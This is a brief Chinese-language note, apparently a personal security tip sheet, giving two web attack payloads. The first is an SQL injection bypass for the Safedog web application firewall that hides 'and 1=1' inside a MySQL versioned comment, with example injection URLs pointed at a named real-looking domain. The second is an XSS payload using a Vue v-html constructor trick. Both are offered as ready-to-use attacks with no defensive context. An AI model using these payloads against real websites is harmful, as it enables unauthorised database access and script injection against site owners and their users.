1、sql注入绕过安全狗waf：  
and 1=1过安全狗and /*!1=1*/  
实例如下  
http://www.smallview.cn/solution_cid_2'and 1=1.html  
http://www.smallview.cn/solution_cid_2'and /*!1=1*/.html

2、twitter上最新xss payload：  
<script>alert("ybdt")</script>  
变为  
<x v-html=_c.constructor('alert(1)')()>
